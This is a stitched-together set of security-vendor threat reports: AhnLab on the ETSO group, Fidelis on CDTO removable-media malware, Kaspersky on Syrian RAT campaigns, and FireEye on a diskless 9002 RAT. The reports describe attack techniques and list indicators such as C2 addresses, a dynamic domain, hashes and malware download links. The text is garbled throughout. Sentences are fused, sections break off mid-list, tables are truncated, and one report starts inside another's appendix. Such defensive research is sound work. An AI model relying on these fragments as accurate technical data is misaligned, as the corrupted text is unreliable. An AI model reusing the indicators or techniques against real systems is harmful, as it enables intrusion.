The Chinese-originated APT Attack Group ETSO has been attacking South Korea since 2011.A-FIRST from AhnLab has done a forensics analysis using the ASDE (AhnLab Smart Defense Enterprise) network and on the damaged company for years.According to the study, ETSO is different from other attackers in following ways:

- ETSO analyzes the update structure of a product popularly used in South Korea, in order to distribute malicious codes through reliable products and ultimately, the company.- To continuously benefit monetarily and acquire extra information, the ETSO Group does not destroy the infected system and the infrastructure.- By disclosing the digital certificate, additional damage is made on the target company because the certificate can be used in other attacks for different purposes.- The attacker moves into the internal system by seizing the AD server of the company to attack, using the pass the hash attack.- Regarding the malicious code file naming, a ‘DLL search order hijacking’ is used (for example: wiarpc.dll, tsvipsrc.dll).-Not only was the feature embedded on the back door used to attack the cyber money update, but a direct DB query through SQLCMD.EXE, Trigger through the transformation of Store Procedure registered in the email table and opends60.dll(SQL Open Data Services DLL) transformation were all used in the MS SQL DB in the attack.</section>

<noncontent>
AhnLab, Inc.
2318-D Walsh Ave. Santa Clara, CA 95051 USA
Toll Free +1.800.511.AhnLab (1.800.511.2465)
          +1.877.551.2690
www.ahnalb.com
Email info@ahnlab.com
© 2013 AhnLab, Inc. All rights reserved.Disclosure to or reproduction for others without the specific written authorization of AhnLab is prohibited

</noncontent>
</doc><doc>
<section>
<heading>Fidelis Threat Advisory #1011</heading>
 <heading>“New CDTO: A Sneakernet Trojan Solution”</heading>

 <heading>January 15, 2014</heading> 
   
 <heading>Document Status: FINAL   
 Last Revised: 2014-­‐01-­‐15</heading> 
   
 <heading>Executive Summary:</heading>
 The General Dynamics Fidelis Cybersecurity forensics team analyzed several related malware
 samples that together provide a sophisticated mechanism to gather data from individual computer
 systems.The malware appears to be part of a system that may be optimized for use by an insider
 agent and/or for collecting data from disparate networks or air-­‐gapped systems.The malware
 includes features to clean up after itself by deleting key indicators that it was present.The malware system apparently includes additional components that have not been identified.These components would potentially perform additional command and control functions and
 potentially exfiltration from the central host.The sophistication of the malware and the effort
 involved in its development would indicate that it was developed for a high value target.However,
 the specific targeting of this malware is not clear at this time.We are concerned that while the
 malware system was probably developed for a specific target or family of targets, it could be
 employed with little adaptation against virtually any target.This threat advisory describes the functionality of the three malware files to include command
 inputs and the resulting behavior of the malware.The Fidelis XPS™ advanced threat defense system has been updated with rules to detect various
 components of this malware system.However, the fact there are still unanswered questions about
 the components of the malware system and its intended targeting, emphasizes the importance of
 employing that best practices such as denying use of removable media on sensitive systems  and
 disabling autorun!This is particularly true for systems that are not protected by Fidelis XPS.Additional reverse engineering and analysis is on-­going at this time.</section>

<section>
 <heading>Forensic Analysis Findings:</heading>
 On 8 Jan 2014, The Fidelis Network Defense and Forensics team received three files: netsat.exe,
 netui3.dll and winmgt.dll.All three files were 32 bit executable files.Preliminary analysis disclosed
 netsat.exe would terminate when run if the system date was on or after 21 Jun 2013.The submitted
 files appeared to represent two parts of a suspected data collection scheme.Essentially, netsat.exe
 appeared to operate as a master program that infected removable media connected to the system
 whereon it was running and collected data from infected drives when the drives returned.netsat.exe received commands from an encrypted file stored on the local system.The infection was
 in the form of a renamed netui3.dll or winmgt.dll file along with an Autorun.inf file set to run the
 renamed netui3.dll/winmgt.dll when the infected drive was connected to a target host.There could
 
 be many iterations of netsat.exe running on enterprise or targeted entity systems.Based on
 available analysis results, netsat.exe could collect surreptitiously gathered data from any infected
 drive connected to the system whereon netsat.exe was running, e.g., the infected drive would not
 have to be processed by the same system whereon it became infected.Data, in the form of files,
 destined for exfiltration may be obfuscated via a custom XOR operation.The gathered data would
 ostensibly be exfiltrated via other means.Some components of the malware’s behavior are possibly remarkable.Quickly considering these
 results in cursory questions reflected as follows:
 
 •   Command and Control (C2) appears to be accomplished via providing commands in an
     encrypted file stored on the local ‘master’ system (re: netsat.exe).This C2 scheme would
     seem to dictate:
         o Intruder remote access to the ‘master’ system
         o Intruder local access to the ‘master’ system   
         o a C2 delivery/retrieval component, such as another piece of code that downloads a
           C2 file   
 
 •   Available information precludes determination of the means of exfiltration.netsat.exe’s
     data collection functionality suggested data destined for exfiltration might be collected by
     the ‘master’ system.This possibility suggests:
         o Intruder remote access to the ‘master’ system
         o Intruder local access to the ‘master’ system
         o An exfiltration mechanism in the form of another piece of code
 
 <heading>Detection</heading>       
 
 Scanning with several select third party malware detection applications resulted in zero
 detections.Cursory online research disclosed a file named netui3.dll was possibly submitted to
 VirSCAN.org on or before 2 Dec 2013.The name netui3.dll appears to have been used for
 malware in the past and was likely associated with a backdoor.The name may be a play on
 the name netui2.dll, a legitimate Windows file name.If the system date was after the hard coded dates, the malware would delete itself
  and terminate.All rights reserved.OriginalFilename:            cdto.dll   
 ProductName:                 Microsoft Corporation.All rights reserved.ProductVersion:              5, 1, 2600, 0     
 
 Child Type:                  VarFileInfo   
 Translation:                 1033/1200     
</list>
 The Language/Code Page code 1033 denotes U.S. English.This versioning information
 appears contrived.However, it looks convincing enough to pass cursory inspection, i.e.,
 the format appears legitimate and the appearance does not engender suspicion.Cursory
 online searches failed to disclose what, if anything Cdto might be associated with.Scanning disclosed the file contained a function possibly associated with TEAN
 encryption.This appeared to indicate TEA (Tiny Encryption Algorithm) involvement.(Note: The encryption is used to encrypt commands stored in a file on the local system.)The submitted files named netui3.dll and winmgt.dll did not have embedded versioning
 Information like netsat.exe did.TEMP.</section>
 
 <section>
 <heading>Network Artifacts:</heading>
 This cursory analysis disclosed no network artifacts specific to the malware’s operation.However,
 evidence of any of the files involved (MD5, strings, file names) traversing the network, e.g., on the
 move, may be indicative of netsat.exe, et al presence.Given what was revealed during this cursory
 analysis, finding string and or hash artifacts in SMB traffic seemed the most likely possibility with
 regard to network detection.</section>
 
 <section>
 <heading>Strings:</heading>
 
 netsat.exe
 
 The following interesting strings were noted in the raw netsat.exe file:
 <list>
     VMProtect begin
     VMProtect end
     !Path -­‐-­‐ > %s to Added
     !Pathlen = %u
     AddInit -­‐> ci.DestFile:%s
     !ad dri, nD=%d
     netui3.dll
     netwi.drv
     Global\Mtx_Sp_On_PC_1_2_8
      
     Cdto Netware 2.12 Provider
     !Cr Des
     !Cr De.i.Versioning is possible.For example, the submitted netui3.dll
 sample may not match the submitted netsat.exe sample in terms of versioning.However,
 analysis assumed, for the sake of efficiency, that the submitted netui3.dll and submitted
 netsat.exe file were associated.The submitted winmgt.dll file appeared very similar to
 netui3.dll.However, some differences suggested the two files represented disparate versions.Analysis disclosed date sensitivity built into the submitted files.It is important to note that reverse engineering
 and analysis of the malware system is still underway.We expect to provide additional data, and
 some of this information may change as a result of continued research.However, due to the unique functionality of malware system and its potential for employment
 against targets beyond the initially intended victim, the network security community should be
 concerned and track this malware closely.While we have updated the Fidelis XPS system to detect known components of the malware family,
 this package reemphasizes the importance of employing good basic network security practices such
 as denying use of removable media on sensitive systems and disabling autorun!</section>                     
 
 </doc><doc>
<cover>Syrian Malware,
the ever-evolving threat
Kaspersky Lab Global Research and Analysis Team




Version 1.0
August 2014
   2</cover>


<header>1.Executive Summary</header>
<section>
The Global Research and Analysis Team (GReAT) at Kaspersky Lab has discovered new malware
attacks in Syria, with malicious entities using a plethora of methods from their toolbox to hide
and operate malware.In addition to proficient social engineering tricks, victims are often tempted
to open and explore malicious files because of the dire need for privacy and security tools in the
region.In the hopes of maintaining anonymity and installing the latest “protection”, victims fall prey
to these malicious creations.A vast majority of the samples obtained were found on activist sites
and in social networking forums.The victims are distributed across different countries:
•	 Syria
•	 Lebanon
•	 Turkey
•	 Kingdom of Saudi Arabia
•	 Egypt
•	 Jordan
•	 Palestine
•	 United Arab Emirates
•	 Israel
•	 Morocco
•	 United States


The group members are operating from different locations around the world:
•	 Syria
•	 Russian Federation
•	 Lebanon


The group’s attacks are evolving and they are making extensive use of social engineering techniques
to trick targeted victims into running their malicious files.The number of domains linked to the attacks is 20.The number of IP addresses linked to the attacks is 47.The samples details and domains lists used by the attackers can be found in the Appendices 1 and 2
in the end of the document.Protection and resilience against these attacks is ensured through the use of a multi-layered security
approach, having up to date security products, and mainly by being sceptical about suspicious files.</section>


<noncontent>TLP: Green                                           For any inquire please contact intelreports@kaspersky.com</noncontent>

<toc>Contents
1.Executive Summary											2
2.Introduction												5
3.Analysis													6
	3.1.Infection Vectors										6
		3.1.1.Skype messages									6
		3.1.2.Facebook posts									7
		3.1.3.YouTube Videos									8
	       3.2.Samples and types of files									                                                        9
		             3.2.1.The National Security Program							                                              9
		             3.2.2.Files named “Scandals” are quite attractive					                                  14	
		             3.2.3.“Ammazon Internet Security” the “popular Antivirus”				                           16
		             3.2.4.You’ve installed the latest antivirus solution, now let’s “protect your network”	 19
		             3.2.5.Whatsapp and Viber for PC: Instant messaging, instant infection		                 20
		3.2.6.Beware of chemical attacks								22
		3.2.7.Commands and functionality							23
		             3.2.8.Evolution of malware attack file numbers						                                    25
		             3.2.9.Locations, domains and team							                                                26
	             3.2.10.Victims										                                                                 28
	             3.2.11.Activist Behavior									                                                        30
	3.3.Attribution											32
4.Kaspersky Lab MENA RAT Statistics									34
5.Conclusion													37
Appendix 1: Samples											38
Appendix 2: C&C Domains											47
</toc>



<noncontent>TLP: Green                                             For any inquire please contact intelreports@kaspersky.com
                                                                                                            5</noncontent>


<header>2.Introduction</header>
<section>The geopolitical conflicts in the Middle East have deepened in the last few years; Syria is no
exception.The crisis is taking many forms, and the cyberspace conflict is intensifying as sides try to
tilt the struggle, by exploiting cyber intelligence and exercising distortion.In the last few years cyber-attacks in Syria have moved into the front line; many activities in
cyberspace have been linked to Syria, especially those conducted by the Syrian Electronic Army and
pro-government groups.The Global Research and Analysis Team (GReAT) at Kaspersky Lab has found new malware attacks
in Syria, using new but not advanced techniques to hide and operate malware, in addition to using
proficient social engineering tricks to deliver malware by tricking and tempting victims into opening
and exploring malicious files.The malware files have been found on hacked activist sites, web pages
and in social networking forums.Cyber Arabs, an Arabic-language digital security project of the IWPR (Institute for War and Peace
Reporting), reported four of these samples in March 2014.The same samples were also reported
on Syrian Facebook pages (‫تقنيون ألجل الحرية‬, Technicians For Freedom): https://www.facebook.com/
tech4freedom


Given the complexity of the situation, there are many factors and entities at play in this event, but
from the outside these are all largely speculative.Pro-government groups talk about “defense” and
opposition activists talk about “offense”.Here, we will only focus on the malware and the facts that
have been found during the analysis, presenting only relevant information, in the hope of setting a
clear context for this research.</section>


<noncontent>TLP: Green                                            For any inquire please contact intelreports@kaspersky.com
   6</noncontent>


<header>3.Analysis</header>
<section>
<heading>3.1.Infection Vectors</heading>

Malware writers are using multiple techniques to deliver their files and entice the victims to run them,
creating an effective infection vector.Mainly depending on social engineering the attackers exploit:
• Victims’ trust in social networking forums
• Victims’ curiosity in following news related to political conflict in Syria
• Victims’ fear of attacks from government
• Victims’ lack of technology awareness


Once they have infected the victim’s computer, attackers have full access and control over victim’s
devices.In the following section we show different versions of posts sent via popular file sharing
sites or social networking platforms.The sample details and domain lists used by the attackers can
be found in the Appendices 1 and 2 in the end of the document.</section>
<section>
<heading>3.1.1.Skype messages</heading>

Messages sent via Skype offer links to download:
1.The “SSH VPN” program to encrypt communication
2.The popular and effective antivirus with daily updates from “Ammazon Internet Security”
3.The “SmartFirewall” to block connections made by malware and bad programs

<figure></figure>


The messages are usually sent from fake or compromised accounts.</section>

<noncontent>TLP: Green                                             For any inquire please contact intelreports@kaspersky.com
                                                                                                          7</noncontent>


<section>
<heading>3.1.2.Facebook posts</heading>

<figure></figure>

The same messages sent via Skype are also shared via the Facebook social platform, asking victims
to install these “security programs” to protect themselves from malware infections and cyber-attacks,
especially government attacks.</section>



<noncontent>TLP: Green                                          For any inquire please contact intelreports@kaspersky.com
   8</noncontent>

<section>
<heading>3.1.3.YouTube Videos</heading>

<figure></figure>
In the following example, we can see a YouTube video providing links to download fake Whatsapp
and Viber applications for PC.By using everyday technologies that are commonly used by a broad
audience, attackers increase the effectiveness of their operations and their infection rates.</section>



<noncontent>TLP: Green                                        For any inquire please contact intelreports@kaspersky.com
                                                                                                             9</noncontent>

<section>
<heading>3.2.Samples and types of files</heading>

Analysis has led us to identify the following RAT variants being used in the wild:
•	 ShadowTech RAT
•	 Xtreme RAT
•	 NjRAT
•	 Bitcomet RAT
•	 Dark Comet RAT
•	 BlackShades RAT


The samples collected during our research can be classified as follows.Old samples

Samples obtained during 2013 are simple RAT executable files, compressed and sent to victims
using a wide range of delivery options.Newer samples were typically found to use “.scr” containers
in order to hide malicious files and avoid early detection by security solutions.New samples

More recent samples, starting from the end of 2013, have shown a more organized development
effort, creating highly stealth and graphically-enticing applications.In this analysis we have seen how Syrian malware has evolved, showing no signs of stopping any
time soon.Even though new malicious Syrian samples are appearing each day, the subset presented
here will hopefully give the reader an overall view of the techniques and tools that are currently
being used to target Syrian citizens.</section>
<section>
<heading>3.2.1.The National Security Program</heading>

Curiosity killed the cat: browsing a previously leaked spreadsheet of wanted activists leads to
infection.We found a set of compressed files on a popular social networking site; when, extracted it
showed a database containing a list of activists and wanted individuals in Syria.A video entitled
“‫ “إختراق أجهزة الكمبيوتر الخاصة بالمجرم علي مملوك وباقي عصابة االسد‬was published on November 9 2013, and
the download link for this database application was included in the information section of the video.<noncontent>TLP: Green                                             For any inquire please contact intelreports@kaspersky.com
    10</noncontent>


<figure></figure>

The download URL redirected victims to a file-sharing service where the file was being hosted.The
compressed RAR file “‫برنامج االٔمن الوطني‬.rar”, with the MD5 signature 0c711bf29815aecc65016712981
59a74 and a file-size of 7,921,063 bytes was protected with the password “111222333”.The video requests the victim to scan the password protected “.rar” file using VirusTotal to verify
that it is not infected.After extracting all the files to a temporary folder, we were presented with the application itself and
a text file needed to access the “hidden” features of the program.<figure></figure>


The file “PASSWORD.txt file” contained the following text:


syria123!The first button (‫فيش عام شامل‬, General Global File) uses “data-base.db.exe” (MD5 8f16efb51fe67961e
e31c4f36cbe11db), which was placed into “C:\Users\User\AppData\Roaming“and, when executed,
extracts the Excel spreadsheet file “Data-Base.xslx” (MD5 f0a8a1556efbb106b6297700d4cce61b)
from the “Data-Base.db” (MD5 95a5c3e91bbb4a3a323433841fbef82a) file in the main folder.The last button (‫ )إنهاء الب رنامج‬is the exit button.<noncontent>TLP: Green                                              For any inquire please contact intelreports@kaspersky.com
   12</noncontent>


<figure></figure>

Here is some interesting information worth noting:
•	 “‫ب رنامج االٔمن الوطني‬.exe” is not detected as a malicious file.•	 The file “data-Base.db” is detected as a malicious file.The file connects to the IP address 31.9.48.7 TCP on port 999.As mentioned in previous
reports, the IP address 31.9.48.7 belongs to the Syrian Telecommunications Establishment (STE).<figure></figure>


Other temporary files used for the infection were also detected, such as “system32.exe” (MD5:
9424b355a3670fd7749d3d25cbea18cb) which was copied into the “C:\Users\user\appdata\
local\temp\” folder.<figure></figure>


<noncontent>TLP: Green                                         For any inquire please contact intelreports@kaspersky.com
   14</noncontent>

The presence of DarkComet’s “DC_MUTEX-*” was a giveaway of the usage of this remote
administration tool.During infection, the Excel spreadsheet is displayed, comprising 96763 rows and 13 columns of
activist information.The rows correspond to records of individuals wanted by the government and
the columns correspond to information about the individuals.While there is no column description,
data in each column reflects the type of data.</section>

<section>
<heading>3.2.2.Files named “Scandals” are quite attractive
	      Using shockingly disturbing videos to distribute malware</heading>

A disturbing video showing injured victims of recent bombings was used to appeal to people’s fear
and exert them to download a malicious application available in a public file-sharing website.After
our initial analysis, the file named “‫فضائح‬.exe” proved to be heavily obfuscated with the commercial
utility “MaxToCode” for .NET as a means of avoiding early detection by antivirus solutions.<figure></figure>

When executed, the original sample created another executable file in the Windows’ temporary
folder (C:\Users\[USERNAME]\AppData\Local\Temp) named “Trojan.exe”, which corresponds to
the code of the RAT itself.This is used to save all keystrokes and system activity to another file in
the same location, “Trojan.exe.tmp”.<noncontent>TLP: Green                                            For any inquire please contact intelreports@kaspersky.com
                                                                                                         15</noncontent>

<code>
</code>


Captured information is sent to a dynamic domain corresponding to the host “hacars11.no-ip.biz”,
using local port 1177 with no SSL encryption (but base64 encoded), making the analysis of the
network traffic a much easier task.During the initial connection to the remote server (after an initial
ping to check for internet connectivity), the Trojan will send the machine’s name, installed Windows
version, logged username, webcam availability and the version of the RAT in use.<figure></figure>


Several embedded command line scripts are in charge of adding the Trojan’s executable file to the
Windows Firewall allowed list, while at the same time disabling security zone checking in Internet
Explorer.System persistence is obtained via a modification in the “Software\Microsoft\Windows\
CurrentVersion\Run” registry key and by adding a copy of the malware to the Startup folder.<noncontent>TLP: Green                                           For any inquire please contact intelreports@kaspersky.com
   16</noncontent>


<figure></figure>

Even though different obfuscation techniques are used in the samples we analysed, all of them have
underlying dependencies on the .NET framework namespaces, which eventually allows deep source
code inspection of the threat.</section>



<noncontent>TLP: Green                                         For any inquire please contact intelreports@kaspersky.com
                                                                                                             17</noncontent>

<section>
<heading>3.2.3.“Ammazon Internet Security” the “popular Antivirus”</heading>

If you thought the era of fake antivirus programs was over, here comes a newly developed sample
to challenge your beliefs.With the innocent title of “Ammazon Internet Security”, this malicious
application tries to mimic a security scanner, even including a quite thorough graphical user
interface and some interactive functionality.<figure></figure>


Again, this shows the simplicity of creating a graphical user interface that will trick most of the non-
tech-savvy population.Using nothing more than a couple of buttons and a catchy name, Syrian malware
groups were hoping that the intended victims would fall for the trap.Analyzing the code interestingly
revealed that it has the look--feel of a security application; but, of course, no real security features.While
silently executing a remote administration tool when launching this “security suite”, targeted victims
were left without their “Ammazon” protection but witha RAT installed.From the Windows process list shown in Process Explorer, we were able to see “J.L Antivirus 4.0”
executing in our system, and through Process Monitor we caught the creation of the “analysis” log
file for our fake antivirus.Behind the curtains, a connection is made to a remote host, sending real
time information on all our activities — the real cost of this free internet security suite!Among the many programming methods found inside the source code, we were even able to find
a “CheckForUpdates” function; and if you look closely enough you can even see “Detection” and
“Quarantine” assemblies included in this application.So, not only has a lot of work gone into creating
this fake antivirus, the authors also followed good programming practices and implemented modules for
each specific (albeit fake) functionality.Maybe at a really quick first sight this could pose as a legitimate
tool, but a deeper inspection reveals its true malicious nature.<noncontent>TLP: Green                                               For any inquire please contact intelreports@kaspersky.com
   18</noncontent>


<figure></figure>

The real log file was one where all keystrokes were recorded and later sent from the computer via a TCP
connection.Even though this type of keylogging functionality is nothing new, when we consider how
these malicious applications are being used, and the control they give to the attackers, we can start to
measure the importance of reporting these threats and providing protection from them.Evidently, the malware authors didn’t care much to provide an option to close the “antivirus”,
and if you were to kill the process you would get a nice ‘blue screen of death’ and an unexpected
system reboot.Surely, the fake application will load again once everything is back up, creating an
interesting method for guaranteeing persistence.<figure></figure>
</section>


<noncontent>TLP: Green                                            For any inquire please contact intelreports@kaspersky.com
                                                                                                          19</noncontent>

<section>
<heading>3.2.4.You’ve installed the latest antivirus solution, now let’s “protect your 	
	      network”</heading>

Total Network Monitor (which is a legitimate application) was inside another sample we found,
used with embedded malware for spying purposes.Offering security applications to protect against
surveillance is one of the many techniques used by malware writing groups to get victims who are in
desperate need for privacy to execute these dubious programs.An almost fully functional version of the “Total Network Monitor” utility is included.What this
modified version does not show is the remote connection made to a host where f system information
is dumped.The actual infection is performed when first clicking on the installer, which uses
obfuscation to hide all malicious activity until the “legitimate” tool is completely installed.<figure></figure>


As with other samples reviewed, system persistence is obtained by modifying Windows start-up registry
keys.Using names such as “Desktop Manager” increases the likelihood for this threat to go unnoticed.However, the entry name “empty” or “empty.exe” should raise a red flag when auditing these keys.</section>
<section>
<heading>3.2.5.Whatsapp and Viber for PC: Instant messaging, instant infection</heading>

As with other samples, social engineering does all of the heavy work.Instant messaging applications
for desktop operating systems have been used in the past to spread malware and it seems that Syrian
malware authors have jumped on the bandwagon.In contrast to the “Ammazon Internet Security”, these
samples don’t contain any graphical user interface or even an error message that will tell the victim not
to worry about their security.Heading straight for system infection has proven successful for them, and
using these popular application names gets the interest of a much larger audience.<noncontent>TLP: Green                                            For any inquire please contact intelreports@kaspersky.com
   20</noncontent>


<figure></figure>

The following screenshot shows how the application name, intended functionality and even the icon
used, all work in conjunction to create a believable story for the victim.And this is not a comprehensive
list, by any means.Framing and social engineering techniques are playing an essential role in all Syrian
related malware threats and the trend suggests that the complexity of them will only keep on increasing.<figure></figure>
</section>
<section>
<heading>3.2.6.Beware of chemical attacks</heading>

Another attack uses social engineering tricks.The sample 38e3bc8776915dbd2e55a4d90f85a872,
named “Kimawi.exe” and with JPG icon, is a RAT file bound to the picture “Kimawi.jpg”.This
picture is a previously leaked paper supposedly by the regime in Syria warning military units to
prepare for chemical attacks from friendly units.<noncontent>TLP: Green                                             For any inquire please contact intelreports@kaspersky.com
                                                                                                       21</noncontent>


<figure></figure>

                                            <caption>Kimawi.jpg</caption>

</section>
<section>
<heading>3.2.7.Commands and functionality</heading>

Different remote administration tools have been spotted in the wild; most of them provide an
extensive range of functionality to fully control infected systems.These include:
•	Keylogging
•	     Capturing screenshots and webcam control.•	     Recording live sound/video.•	     Installing programs
•	     Uploading/downloading files
•	     File, process and registry key management
•	     Remote shell
•	     Executing DDoS attacks

TLP: Green                                         For any inquire please contact intelreports@kaspersky.com
   22

Among the most popular RAT found in the samples subset is Dark Comet, a free remote
administration tool that provides a comprehensive command set for the attackers to use in their
malicious purposes.<figure></figure>


                             <caption>DarkComet Control panel & Functionality</caption>

Another RAT widely used in the Arab world is NjRAT, which includes a list of commands (see
below) that can be sent from the controller to the infected system.Terminate Trojan Process

             @        Restart Trojan

“UP”                  Update Trojan

“RG”         ~        Enumerate Registry Key

             !Set Key Value

             @        Delete Registry Key

             #        Create SubKey

             $        Delete SubKey


</table>
</section>

<noncontent>TLP: Green                         For any inquire please contact intelreports@kaspersky.com
   24</noncontent>

<section>
<heading>3.2.8.Evolution of malware attack file numbers</heading>

The attackers are working on full power, and the number of attacks and malicious files being
distributed is constantly increasing as they become more organized and proficient.Below is the
timeline distribution for malicious files distributed during 2013-2014, based on the first time they
were distributed or seen in public (Skype, Facebook, file-sharing, email, etc.).Locations, domains and team</heading>

The group responsible for the attacks is using common techniques shared by many of the hacking groups
around the world.They benefit from dynamic domains that can be linked to their modem devices and
configured with forward functionality to a public IP address assigned by the ISP.By restarting their
modems they obtain a new address, creating a dynamic infrastructure that can be easily managed.Dynamic Update Clients (DUC) on their computer devices (usually the same as the RAT server) are in
charge of having the dynamic domain provider update to the newly assigned address.We suspect
this subnet has been allocated to the group, also an indication that they are now operational from a
single location.In early 2014, the group moved to an IP address in Russia (31.8.47.7), to launch multiple new
attacks.</section>
<section>
<heading>Information on domain “All4Syrian.com”</heading>

This domain is registered for the email aloshalaa@gmail.com.It served as a pro-regime website back
in 2012 and is being used for the C&C of some of the RAT files.The domain was registered to okpa1984@gmail.com from 2011 to 2013.Malware has also been seen connecting to xtr.all4syrian.com and vip.all4syrian.com.Victims</heading>

The distribution of victims is confined only to Syria, but also reaches nearby countries.This shows some of the victims located in different countries.<figure></figure>
<figure></figure>

The sample details and domain lists used by the attackers can be found in Appendices 1 and 2 in the
end of this document.</section>
<section>
<heading>3.2.11.Activist Behavior</heading>

It is worth noting that we have seen evidence of activists trying to carry out Denial of Service
attacks on the RAT domains and servers, in an effort to overwhelm their resources and cause their
connections to timeout.The post below shows a warning from activists about pro-government hacker attacks on Facebook
pages, explaining how pro-government groups post links to Trojanized applications in order to infect
users The activists announce in the post that they have spotted a C&C domain used by the Trojans
and that they are attacking it to remove all hacked victims.Attribution</heading>
<figure></figure>


</section>
<section>
<heading>Team and positions</heading>

From many posts, forums and identification videos, it is clear that the group has an organized
structure of teams working together, The names and positions outlined below were collected from
posts on infiltrated forums or pages.They are all either nicknames or incomplete names that do not
enable full identification of the attackers.Kaspersky Lab MENA RAT Statistics</header>
<section>
Remote Administration Tool (RAT) Trojans are malicious programs that allow a remote “operator” to
control a system as if he has physical access to that system.Malicious RATs are widely used by different
types of cybercriminals (hacktivists, script-kiddies, and scammers) and even in some state-sponsored attacks.•	 Four countries from MENA are in the Bifrose top 10 infection list.•	 Three countries from MENA are in the DarkComent top 10.</section>
<noncontent>TLP: Green                                          For any inquire please contact intelreports@kaspersky.com
   36</noncontent>


<header>5.Conclusion</header>
<section>
Syrian malware has a strong reliance on social engineering and the active development of
technologically complex malicious variants.Nevertheless, most of them quickly reveal their true
nature when inspected carefully; and this is one of the main reasons for urging Syrian users to be
extra vigilant about what they download and to implement a layered defense approach.Antivirus software uses either signature or heuristic-based detection to identify malware.On the
one hand, signature detection searches for a unique sequence of bytes that is specific to a piece
of malicious code.On the other hand, heuristic detection identifies malware based on program
behaviour.In our research we were able to collect more than 100 malware samples used to attack
Syrian citizens.Although most of these samples are known, cybercriminals rely on a plethora of
obfuscation tools and techniques in order to change the malware structure so as to bypass signature
scanning and avoid antivirus detection.This proves how critical heuristic technologies are when
it comes to protecting against these types of attack.By being able to identify variants of known
malware types or even new malware families, Kaspersky Lab security products detected all the
collected samples.We expect these attacks to continue and evolve both in quality and quantity.We expect the
attackers to start using more advanced techniques to distribute their malware, using malicious
documents or drive-by download exploits.With enough funding and motivation they might also be
able to get access to zero day vulnerabilities, which will make their attacks more effective and allow
them to target more sensitive or high profile victims.Even though the attackers depend mainly on using known RATs, their rapid improvement and
application of obfuscation techniques, GUI development for fake applications, and code modification
via automated builders, increase the probability that it won’t be too long before they start writing
their own Trojans to take advantage of customized infection capabilities and implement better
security evasion.Finally, having a comprehensive and up-to-date antivirus and firewall should be the first measure
taken by any user that does any type of online activity, especially during these uncertain times when
new cyber threats appear almost daily.</section>


<noncontent>TLP: Green                                           For any inquire please contact intelreports@kaspersky.com
                                                                                                             37</noncontent>


<header>Appendix 1: Samples</header>
<section>
<heading>All samples table</heading>

The list of sample files has been collected through the infection vectors detailed above (Skype, Facebook,
file-sharing, email, etc.).The samples have been either generated using automated tools (RAT server,
obfuscation tools) or developed and bound to RAT files, especially the new samples with graphical content.Mar 18,    abf93ad254cd01997935863c9e556af8
                                                                                          com multiple ports:
                                    2014       96ca1d7e45b03f438804d3b46d22df8a
https://www.dropbox.com/s/                                                                31.8.48.7
                                               1827acc1cf53e6ac9d9b638fc81f50a1
c4kwnh6q0r3ymwf/SSH%20VPN.rar


https://www.facebook.com/photo.‫فضيحة النظام وداعش‬.exe, chrome.@#       Nov 9,      3828971a77d94b6a226064ede528e408 extracts with excel
http://ge.tt/1v3NB7y/v/0              2013        (main executable)                          sheet with previously
                                                                                             leaked details on
http://www.youtube.com/                                                                      wanted activists
watch?v=Cw1vD9DhEc0
‫فضائح‬.exe (=scandals) http://www.Windows_8_Pro_Build_9300_           2012 to                                               data.downloadstarter.<doc>
<section>
<heading>
Operation Ephemeral Hydra: IE Zero-Day Linked to DeputyDog
Uses Diskless Method</heading>
Recently, we discovered a new IE zero-day exploit in the wild, which has been used in a strategic Web
compromise.Specifically, the attackers inserted this zero-day exploit into a strategically important
website, known to draw visitors that are likely interested in national and international security policy.We
have identified relationships between the infrastructure used in this attack and that used in
Operation DeputyDog.Furthermore, the attackers loaded the payload used in this attack
directly into memory without first writing to disk – a technique not typically used by advanced
persistent threat (APT) actors.This technique will further complicate network defenders’ ability
to triage compromised systems, using traditional forensics methods.Enter Trojan.APT.9002

On November 8, 2013 our colleagues Xiaobo Chen and Dan Caselden posted about a new Internet
Explorer 0-day exploit seen in the wild.This exploit was seen used in a strategic Web compromise.The
exploit chain was limited to one website.There were no iframes or redirects to external sites to pull down
the shellcode payload.Through the FireEye Dynamic Threat Intelligence (DTI) cloud, we were able to retrieve the payload
dropped in the attack.This payload has been identified as a variant of Trojan.APT.9002 (aka
Hydraq/McRAT variant) and runs in memory only.It does not write itself to disk, leaving little to
no artifacts that can be used to identify infected endpoints.Specifically, the payload is shellcode, which is decoded and directly injected into memory after
successful exploitation via a series of steps.After an initial XOR decoding of the payload with the key
“0x9F”, an instance of rundll32.exe is launched and injected with the payload using CreateProcessA,
OpenProcess, VirtualAlloc, WriteProcessMemory, and CreateRemoteThread.<figure></figure>
Figure 1 – Initial XOR decoding of shellcode, with key ’0x9F’
<figure></figure>
Figure 2 – Shellcode launches rundll32.exe and injects payload

After transfer of control to the injected payload in rundll32.exe, the shellcode is then subjected to two
more levels of XOR decoding with the keys ’0×01′, followed by ’0x6A’.<figure></figure>
Figure 3- Decoding shellcode with XOR key ’0×01′
<figure></figure>
Figure 4 – Decoding shellcode with XOR key ’0x6A’

Process execution is then transferred to the final decoded payload, which is a variant of the 9002 RAT.<figure></figure>
Figure 5 – Transfer of process execution to final decoded payload

The fact that the attackers used a non-persistent first stage payload suggests that they are
confident in both their resources and skills.As the payload was not persistent, the attackers had
to work quickly, in order to gain control of victims and move laterally within affected organizations.If
the attacker did not immediately seize control of infected endpoints, they risked losing
these compromised endpoints, as the endpoints could have been rebooted at any time – thus
automatically wiping the in-memory Trojan.APT.9002 malware variant from the infected
endpoint.Alternatively, the use of this non-persistent first stage may suggest that the attackers were confident that
their intended targets would simply revisit the compromised website and be re-infected.</section>
<section>
<heading>
Command and Control Protocol and Infrastructure</heading>
This Trojan.APT.9002 variant connected to a command and control server at 111.68.9.93 over port 443.It
uses a non-HTTP protocol as well as an HTTP POST for communicating with the remote
server.However, the callback beacons have changed in this version, in comparison to the older 9002
RATs.The older traditional version of 9002 RAT had a static 4-byte identifier at offset 0 in the callback network
traffic.This identifier was typically the string “9002″, but we have also seen variants, where this has been
modified – such as the 9002 variant documented in the Sunshop campaign.<figure></figure>



Figure 6 – Traditional 9002 RAT callback beacon

In contrast, the beacon from the diskless 9002 payload used in the current IE 0-day attack is
remarkably different and uses a dynamic 4-byte XOR key to encrypt the data.This 4-byte key is
present at offset 0 and changes with each subsequent beacon.FireEye labs is aware that the 4-
byte XOR version of 9002 has been in the wild for a while and is used by multiple APT
actors, but this is the first time we’ve seen it deployed in the diskless payload method.<figure></figure>
Figure 7 – Sample callback beacons of the diskless 9002 RAT payload
<figure></figure>
Figure 8 – XOR decrypted callback beacons of the diskless 9002 RAT payload

